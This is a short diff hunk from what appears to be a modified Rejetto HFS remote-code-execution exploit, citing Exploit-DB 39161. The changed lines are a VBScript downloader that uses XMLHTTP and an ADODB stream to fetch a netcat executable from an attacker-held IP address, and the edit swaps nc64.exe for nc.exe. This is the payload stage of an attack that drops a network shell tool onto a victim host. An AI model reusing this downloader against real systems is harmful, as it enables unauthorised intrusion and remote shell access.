@@ -10,7 +10,7 @@ Source:  Rejetto HFS exploit:  https://www.exploit-db.com/exploits/39161
 ####  Includes below changes to respctive script.vbs
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "http://10.6.26.69/nc64.exe", False
+xHttp.Open "GET", "http://10.6.26.69/nc.exe", False
 xHttp.Send
 with bStrm
     .type = 1 '//binary
